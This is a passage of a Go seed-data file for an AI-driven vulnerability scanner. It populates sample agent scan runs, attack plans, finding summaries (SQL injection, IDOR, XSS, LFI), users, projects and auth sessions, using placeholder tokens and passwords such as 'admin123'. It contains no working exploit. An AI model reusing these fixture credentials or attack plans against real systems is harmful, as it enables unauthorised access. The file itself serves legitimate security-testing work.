				"scan": map[string]interface{}{"input": 18500, "output": 3120},
			},
			TotalInputTokens:  22700,
			TotalOutputTokens: 3900,
			EstimatedCostUSD:  0.6330,
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0002.tar.gz",
			StartedAt:         now.Add(-2*time.Hour - 30*time.Minute),
			CompletedAt:       now.Add(-2*time.Hour - 27*time.Minute),
			DurationMs:        180000,
			CreatedAt:         now.Add(-2*time.Hour - 30*time.Minute),
		},
		// 3. Completed swarm — full 7-phase scan (master run)
		{
			UUID:             "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:         scans[1].UUID,
			Mode:             "swarm",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			TargetURL:        "https://api.shop.local",
			SourcePath:       "https://github.com/vigolium/shop-api",
			SourceType:       database.SourceTypeGitURL,
			InputRecordCount: 28,
			Status:           "completed",
			CurrentPhase:     "report",
			PhasesRun:        []string{"source-analysis", "discover", "plan", "scan", "triage", "rescan", "report"},
			FindingCount:     5,
			RecordCount:      120,
			SavedCount:       5,
			AttackPlan:       `{"phases":["source-analysis","discover","plan","scan","triage","rescan","report"],"focus_areas":["authentication bypass","IDOR","mass assignment"],"modules":["sqli","ssti","idor","mass-assign"],"custom_extensions":["shop-auth-bypass.js"]}`,
			TriageResult:     `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2},"notes":"3 SSTI findings were false positives caused by template syntax in API documentation responses"}`,
			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://api.shop.local/api/v1/auth/login","description":"SQL injection in login endpoint allows authentication bypass"},{"module":"idor","severity":"high","url":"https://api.shop.local/api/v1/users/2","description":"IDOR allows accessing other users' profiles by changing user ID"},{"module":"mass-assign","severity":"high","url":"https://api.shop.local/api/v1/users/me","description":"Mass assignment allows setting admin role via PATCH request"},{"module":"ssti","severity":"medium","url":"https://api.shop.local/api/v1/products","description":"Server-side template injection in product description field"},{"module":"crlf","severity":"medium","url":"https://api.shop.local/api/v1/export","description":"CRLF injection in export filename parameter"}]}`,
			TokenUsage: map[string]interface{}{
				"source-analysis": map[string]interface{}{"input": 42000, "output": 5400},
				"plan":            map[string]interface{}{"input": 15200, "output": 2100},
				"extension":       map[string]interface{}{"input": 9800, "output": 1750},
				"triage":          map[string]interface{}{"input": 28000, "output": 4200},
				"rescan":          map[string]interface{}{"input": 12000, "output": 1800},
			},
			TotalInputTokens:  107000,
			TotalOutputTokens: 15250,
			EstimatedCostUSD:  2.7488,
			SessionID:         "agent-sess-swarm-shop",
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003",
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0003.tar.gz",
			StartedAt:         now.Add(-1*time.Hour - 30*time.Minute),
			CompletedAt:       now.Add(-1 * time.Hour),
			DurationMs:        1800000,
			CreatedAt:         now.Add(-1*time.Hour - 30*time.Minute),
		},
		// 3a. Swarm sub-run — source-analysis specialist spawned by agent-0003
		{
			UUID:                  "agent-0003a-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:              scans[1].UUID,
			ParentAgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Mode:                  "swarm",
			AgentName:             "source-analyst",
			Protocol:              "sdk",
			Model:                 "claude-sonnet-4-6",
			TargetURL:             "https://api.shop.local",
			SourcePath:            "https://github.com/vigolium/shop-api",
			SourceType:            database.SourceTypeGitURL,
			InputRecordCount:      28,
			Status:                "completed",
			CurrentPhase:          "source-analysis",
			PhasesRun:             []string{"source-analysis"},
			FindingCount:          0,
			RecordCount:           28,
			SavedCount:            0,
			AgentRawOutput:        "Analyzed 12 route files in app/routes/. Identified 28 HTTP routes, 4 auth endpoints, 7 SQL sinks, 2 filesystem sinks. Output written to session plan.",
			TokenUsage: map[string]interface{}{
				"explore":    map[string]interface{}{"input": 18500, "output": 2400},
				"format":     map[string]interface{}{"input": 12000, "output": 1800},
				"extensions": map[string]interface{}{"input": 11500, "output": 1200},
			},
			TotalInputTokens:  42000,
			TotalOutputTokens: 5400,
			EstimatedCostUSD:  0.2268,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/source-analysis",
			StartedAt:         now.Add(-1*time.Hour - 28*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 18*time.Minute),
			DurationMs:        600000,
			CreatedAt:         now.Add(-1*time.Hour - 28*time.Minute),
		},
		// 3b. Swarm sub-run — triage specialist spawned by agent-0003
		{
			UUID:                  "agent-0003b-aaaa-bbbb-cccc-ddddeeee0003",
			ScanUUID:              scans[1].UUID,
			ParentAgenticScanUUID: "agent-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Mode:                  "swarm",
			AgentName:             "triager",
			Protocol:              "sdk",
			Model:                 "claude-opus-4-7",
			TargetURL:             "https://api.shop.local",
			InputRecordCount:      8,
			Status:                "completed",
			CurrentPhase:          "triage",
			PhasesRun:             []string{"triage"},
			FindingCount:          5,
			SavedCount:            5,
			TriageResult:          `{"total_findings":8,"confirmed":5,"false_positives":3,"severity_breakdown":{"critical":1,"high":2,"medium":2}}`,
			TokenUsage: map[string]interface{}{
				"triage": map[string]interface{}{"input": 28000, "output": 4200},
			},
			TotalInputTokens:  28000,
			TotalOutputTokens: 4200,
			EstimatedCostUSD:  0.7350,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0003/children/triage",
			RetryCount:        1,
			StartedAt:         now.Add(-1*time.Hour - 12*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 5*time.Minute),
			DurationMs:        420000,
			CreatedAt:         now.Add(-1*time.Hour - 12*time.Minute),
		},
		// 4. Running swarm — in scan phase
		{
			UUID:              "agent-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Mode:              "swarm",
			AgentName:         "claude",
			Protocol:          "sdk",
			Model:             "claude-opus-4-7",
			TargetURL:         "https://blog.test",
			InputRecordCount:  14,
			Status:            "running",
			CurrentPhase:      "scan",
			PhasesRun:         []string{"discover", "plan"},
			FindingCount:      0,
			RecordCount:       30,
			AttackPlan:        `{"phases":["discover","plan","scan","triage","report"],"focus_areas":["XSS in comments","CSRF on forms","path traversal"],"modules":["xss","csrf","lfi"]}`,
			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 6800, "output": 1200}},
			TotalInputTokens:  6800,
			TotalOutputTokens: 1200,
			EstimatedCostUSD:  0.1920,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0004",
			StartedAt:         now.Add(-12 * time.Minute),
			CreatedAt:         now.Add(-12 * time.Minute),
		},
		// 5. Failed query — agent timeout (pipe protocol, cheap)
		{
			UUID:              "agent-0005-aaaa-bbbb-cccc-ddddeeee0005",
			Mode:              "query",
			AgentName:         "gemini",
			Protocol:          "pipe",
			Model:             "gemini-2.5-pro",
			TemplateID:        "endpoint-discovery",
			TargetURL:         "https://unreachable.internal",
			Status:            "failed",
			ErrorMessage:      "agent execution timed out after 120s: context deadline exceeded",
			PromptSent:        "Discover all API endpoints exposed by the application at https://unreachable.internal. Analyze JavaScript bundles and API documentation.",
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 1200, "output": 0}},
			TotalInputTokens:  1200,
			TotalOutputTokens: 0,
			EstimatedCostUSD:  0.0015,
			RetryCount:        2,
			StartedAt:         now.Add(-6 * time.Hour),
			CompletedAt:       now.Add(-6*time.Hour + 2*time.Minute),
			DurationMs:        120000,
			CreatedAt:         now.Add(-6 * time.Hour),
		},
		// 6. Completed swarm — multi-input targeted scan
		{
			UUID:             "agent-0006-aaaa-bbbb-cccc-ddddeeee0006",
			ScanUUID:         scans[0].UUID,
			Mode:             "scan",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-opus-4-7",
			TargetURL:        "https://example.com",
			VulnType:         "xss,sqli,lfi",
			ModuleNames:      []string{"xss-reflected", "xss-stored", "sqli-error", "sqli-time", "lfi"},
			InputRecordCount: 15,
			Status:           "completed",
			FindingCount:     7,
			RecordCount:      85,
			SavedCount:       7,
			AttackPlan:       `{"iterations":3,"batch_size":5,"modules":["xss-reflected","xss-stored","sqli-error","sqli-time","lfi"],"focus_areas":["search functionality","file inclusion","API parameters"],"custom_extensions":["example-auth-header.js"]}`,
			TriageResult:     `{"total_findings":12,"confirmed":7,"false_positives":5,"severity_breakdown":{"critical":1,"high":3,"medium":2,"low":1}}`,
			ResultJSON:       `{"findings":[{"module":"sqli-error","severity":"critical","url":"https://example.com/api/v1/products?id=1"},{"module":"xss-reflected","severity":"high","url":"https://example.com/search?q=test"},{"module":"lfi","severity":"high","url":"https://legacy.example.com/index.php?page=home"},{"module":"xss-reflected","severity":"high","url":"https://example.com/profile/1"},{"module":"sqli-time","severity":"medium","url":"https://example.com/api/v1/orders?status=pending"},{"module":"xss-stored","severity":"medium","url":"https://blog.test/post/hello-world/comment"},{"module":"lfi","severity":"low","url":"https://example.com/static/../README.md"}]}`,
			TokenUsage: map[string]interface{}{
				"plan":   map[string]interface{}{"input": 12000, "output": 1900},
				"scan":   map[string]interface{}{"input": 34000, "output": 5200},
				"triage": map[string]interface{}{"input": 18000, "output": 3100},
			},
			TotalInputTokens:  64000,
			TotalOutputTokens: 10200,
			EstimatedCostUSD:  1.7250,
			SessionID:         "agent-sess-example-scan",
			SessionDir:        "~/.vigolium/agent-sessions/agent-0006",
			StorageURL:        "gs://vigolium-agents/proj-default/agent-0006.tar.gz",
			StartedAt:         now.Add(-45 * time.Minute),
			CompletedAt:       now.Add(-30 * time.Minute),
			DurationMs:        900000,
			CreatedAt:         now.Add(-45 * time.Minute),
		},
		// 7. Completed query — secret detection
		{
			UUID:         "agent-0007-aaaa-bbbb-cccc-ddddeeee0007",
			Mode:         "query",
			AgentName:    "claude",
			Protocol:     "codex-sdk",
			Model:        "gpt-5",
			TemplateID:   "secret-scan",
			TargetURL:    "https://api.shop.local",
			SourcePath:   "/opt/repos/shop-api",
			SourceType:   database.SourceTypeLocal,
			Status:       "completed",
			FindingCount: 4,
			SavedCount:   4,
			PromptSent:   "Scan the source code and HTTP responses for exposed secrets, API keys, tokens, and credentials.",
			AgentRawOutput: `## Secret Detection Results

### 1. Hardcoded API Key (HIGH)
File: src/config/payment.go:12
Found Stripe live API key: sk-live-abc123xyz789def456

### 2. JWT Secret in Environment (HIGH)
File: docker-compose.yml:34
JWT_SECRET exposed in docker-compose with value "super-secret-jwt-key-change-me"

### 3. Database Password in Config (MEDIUM)
File: src/config/database.go:8
Hardcoded PostgreSQL password: "postgres:p@ssw0rd@localhost:5432"

### 4. AWS Access Key in Test File (LOW)
File: test/fixtures/aws_config.json:3
AWS access key ID found: AKIAIOSFODNN7EXAMPLE (appears to be test/example key)`,
			TokenUsage:        map[string]interface{}{"query": map[string]interface{}{"input": 22000, "output": 3100}},
			TotalInputTokens:  22000,
			TotalOutputTokens: 3100,
			EstimatedCostUSD:  0.3350,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0007",
			StartedAt:         now.Add(-4 * time.Hour),
			CompletedAt:       now.Add(-4*time.Hour + 30*time.Second),
			DurationMs:        30000,
			CreatedAt:         now.Add(-4 * time.Hour),
		},
		// 8. Completed autopilot with source code
		{
			UUID:             "agent-0008-aaaa-bbbb-cccc-ddddeeee0008",
			Mode:             "autopilot",
			AgentName:        "claude",
			Protocol:         "sdk",
			Model:            "claude-sonnet-4-6",
			InputRaw:         "curl -X POST https://api.shop.local/api/v1/auth/login -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"test\"}'",
			InputType:        "curl",
			TargetURL:        "https://api.shop.local",
			VulnType:         "authentication",
			InputRecordCount: 1,
			Status:           "completed",
			FindingCount:     2,
			RecordCount:      12,
			SavedCount:       2,
			SessionID:        "agent-sess-e5f6g7h8",
			SessionDir:       "~/.vigolium/agent-sessions/agent-0008",
			AgentRawOutput: `I'll test the authentication endpoint for common vulnerabilities.

## Step 1: Baseline request
Running: vigolium scan-request --raw "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\n..."

## Step 2: Brute force protection check
No rate limiting detected after 50 requests. This is a finding.

## Step 3: Password policy check
Weak passwords accepted (single character passwords work).

## Step 4: JWT analysis
JWT token uses HS256 with weak secret. Token can be forged.

## Results
- Missing rate limiting on login endpoint (MEDIUM)
- Weak JWT signing secret allows token forgery (HIGH)`,
			TokenUsage: map[string]interface{}{
				"plan":  map[string]interface{}{"input": 3200, "output": 580},
				"probe": map[string]interface{}{"input": 9800, "output": 1400},
			},
			TotalInputTokens:  13000,
			TotalOutputTokens: 1980,
			EstimatedCostUSD:  0.0687,
			StartedAt:         now.Add(-1*time.Hour - 15*time.Minute),
			CompletedAt:       now.Add(-1*time.Hour - 12*time.Minute),
			DurationMs:        180000,
			CreatedAt:         now.Add(-1*time.Hour - 15*time.Minute),
		},
		// 9. Cancelled swarm
		{
			UUID:              "agent-0009-aaaa-bbbb-cccc-ddddeeee0009",
			Mode:              "swarm",
			AgentName:         "claude",
			Protocol:          "sdk",
			Model:             "claude-opus-4-7",
			TargetURL:         "https://example.com",
			Status:            "cancelled",
			CurrentPhase:      "scan",
			PhasesRun:         []string{"discover", "plan"},
			RecordCount:       42,
			ErrorMessage:      "cancelled by user",
			TokenUsage:        map[string]interface{}{"plan": map[string]interface{}{"input": 8500, "output": 1400}},
			TotalInputTokens:  8500,
			TotalOutputTokens: 1400,
			EstimatedCostUSD:  0.2325,
			SessionDir:        "~/.vigolium/agent-sessions/agent-0009",
			StartedAt:         now.Add(-8 * time.Hour),
			CompletedAt:       now.Add(-7*time.Hour - 45*time.Minute),
			DurationMs:        900000,
			CreatedAt:         now.Add(-8 * time.Hour),
		},
		// 10. Pending query — just queued
		{
			UUID:       "agent-0010-aaaa-bbbb-cccc-ddddeeee0010",
			Mode:       "query",
			AgentName:  "claude",
			Protocol:   "sdk",
			Model:      "claude-sonnet-4-6",
			TemplateID: "code-review",
			TargetURL:  "https://blog.test",
			Status:     "pending",
			PromptSent: "Perform a security code review of the blog application focusing on comment handling and content injection vectors.",
			CreatedAt:  now.Add(-30 * time.Second),
		},
	}
}

// ---------------------------------------------------------------------------
// User seeds
// ---------------------------------------------------------------------------

func seedUsers() []*database.User {
	now := time.Now()
	return []*database.User{
		{
			UUID:      "user-0001-aaaa-bbbb-cccc-ddddeeee0001",
			Email:     "admin@vigolium.dev",
			Name:      "Admin User",
			CreatedAt: now.Add(-30 * 24 * time.Hour),
			UpdatedAt: now.Add(-1 * time.Hour),
		},
		{
			UUID:      "user-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Email:     "analyst@vigolium.dev",
			Name:      "Security Analyst",
			CreatedAt: now.Add(-14 * 24 * time.Hour),
			UpdatedAt: now.Add(-3 * time.Hour),
		},
		{
			UUID:      "user-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Email:     "ci-bot@vigolium.dev",
			Name:      "CI Pipeline Bot",
			CreatedAt: now.Add(-7 * 24 * time.Hour),
			UpdatedAt: now.Add(-7 * 24 * time.Hour),
		},
	}
}

// ---------------------------------------------------------------------------
// Project seeds
// ---------------------------------------------------------------------------

func seedProjects(users []*database.User) []*database.Project {
	now := time.Now()
	return []*database.Project{
		{
			UUID:          database.DefaultProjectUUID,
			Name:          "Default Project",
			Description:   "Default project for all scan data when no project is specified",
			OwnerUUID:     users[0].UUID,
			ConfigPath:    "~/.vigolium/vigolium-configs.yaml",
			Tags:          []string{"default", "local"},
			DefaultTarget: "https://example.com",
			LastScanAt:    now.Add(-10 * time.Minute),
			CreatedAt:     now.Add(-30 * 24 * time.Hour),
			UpdatedAt:     now.Add(-1 * time.Hour),
		},
		{
			UUID:          "proj-0002-aaaa-bbbb-cccc-ddddeeee0002",
			Name:          "E-Commerce Platform Audit",
			Description:   "Security assessment of the api.shop.local e-commerce platform including API and frontend",
			OwnerUUID:     users[1].UUID,
			ConfigPath:    "~/.vigolium/projects/shop-audit.yaml",
			Tags:          []string{"ecommerce", "api", "quarterly-audit"},
			DefaultTarget: "https://api.shop.local",
			LastScanAt:    now.Add(-4*time.Hour - 30*time.Minute),
			CreatedAt:     now.Add(-7 * 24 * time.Hour),
			UpdatedAt:     now.Add(-2 * time.Hour),
		},
		{
			UUID:          "proj-0003-aaaa-bbbb-cccc-ddddeeee0003",
			Name:          "Blog Application Pentest",
			Description:   "Targeted pentest of blog.test for XSS and content injection vulnerabilities",
			OwnerUUID:     users[1].UUID,
			Tags:          []string{"pentest", "xss-focused"},
			DefaultTarget: "https://blog.test",
			LastScanAt:    now.Add(-10 * time.Minute),
			CreatedAt:     now.Add(-3 * 24 * time.Hour),
			UpdatedAt:     now.Add(-3 * time.Hour),
		},
		{
			UUID:          "proj-0004-aaaa-bbbb-cccc-ddddeeee0004",
			Name:          "CI Nightly Scan",
			Description:   "Automated nightly security scans triggered by CI pipeline",
			OwnerUUID:     users[2].UUID,
			ConfigPath:    "~/.vigolium/projects/ci-nightly.yaml",
			Tags:          []string{"ci", "automated", "nightly"},
			DefaultTarget: "https://example.com",
			LastScanAt:    now.Add(-12 * time.Hour),
			CreatedAt:     now.Add(-1 * 24 * time.Hour),
			UpdatedAt:     now.Add(-12 * time.Hour),
		},
	}
}

// ---------------------------------------------------------------------------
// Session hostname seeds
// ---------------------------------------------------------------------------

func seedAuthenticationHostnames(scans []*database.Scan) []*database.AuthenticationHostname {
	now := time.Now()
	return []*database.AuthenticationHostname{
		// example.com — admin session with static Bearer token
		{
			Hostname:     "example.com",
			ScanUUID:     scans[0].UUID,
			SessionName:  "admin",
			SessionRole:  "administrator",
			Position:     0,
			SessionToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake-admin-token",
			Headers:      map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.fake-admin-token"},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
		// example.com — regular user session with static Bearer token
		{
			Hostname:     "example.com",
			ScanUUID:     scans[0].UUID,
			SessionName:  "user",
			SessionRole:  "user",
			Position:     1,
			SessionToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.fake-user-token",
			Headers:      map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI0MiIsInJvbGUiOiJ1c2VyIn0.fake-user-token"},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
		// api.shop.local — authenticated session via login flow (token extracted)
		{
			Hostname:         "api.shop.local",
			ScanUUID:         scans[1].UUID,
			SessionName:      "shop-admin",
			SessionRole:      "admin",
			Position:         0,
			LoginURL:         "https://api.shop.local/api/v1/auth/login",
			LoginMethod:      "POST",
			LoginContentType: "application/json",
			LoginBody:        `{"username":"admin","password":"admin123"}`,
			LoginRequest:     "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"admin123\"}",
			LoginResponse:    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"eyJhbGciOiJIUzI1NiJ9.shop-admin-token\",\"expires_in\":3600}",
			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-admin-token",
			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-admin-token"},
			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
			Source:           "agent",
			HydratedAt:       ptrTime(now.Add(-85 * time.Minute)),
			CreatedAt:        now.Add(-90 * time.Minute),
			UpdatedAt:        now.Add(-85 * time.Minute),
		},
		// api.shop.local — regular customer session (token extracted)
		{
			Hostname:         "api.shop.local",
			ScanUUID:         scans[1].UUID,
			SessionName:      "shop-customer",
			SessionRole:      "customer",
			Position:         1,
			LoginURL:         "https://api.shop.local/api/v1/auth/login",
			LoginMethod:      "POST",
			LoginContentType: "application/json",
			LoginBody:        `{"username":"customer1","password":"custpass"}`,
			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-customer-token",
			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-customer-token"},
			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
			Source:           "agent",
			HydratedAt:       ptrTime(now.Add(-88 * time.Minute)),
			CreatedAt:        now.Add(-90 * time.Minute),
			UpdatedAt:        now.Add(-88 * time.Minute),
		},
		// blog.test — cookie-based session
		{
			Hostname:     "blog.test",
			ScanUUID:     scans[2].UUID,
			SessionName:  "blogger",
			SessionRole:  "author",
			Position:     0,
			SessionToken: "session_id=abc123def456; csrf_token=xyz789",
			Headers:      map[string]string{"Cookie": "session_id=abc123def456; csrf_token=xyz789"},
			Source:       "manual",
			CreatedAt:    now.Add(-30 * time.Minute),
			UpdatedAt:    now.Add(-30 * time.Minute),
		},
		// legacy.example.com — basic auth session
		{
			Hostname:     "legacy.example.com",
			SessionName:  "legacy-admin",
			SessionRole:  "admin",
			Position:     0,
			SessionToken: "Basic YWRtaW46cGFzc3dvcmQ=",
			Headers:      map[string]string{"Authorization": "Basic YWRtaW46cGFzc3dvcmQ="},
			Source:       "manual",
			CreatedAt:    now.Add(-2 * time.Hour),
			UpdatedAt:    now.Add(-2 * time.Hour),
		},
	}
}
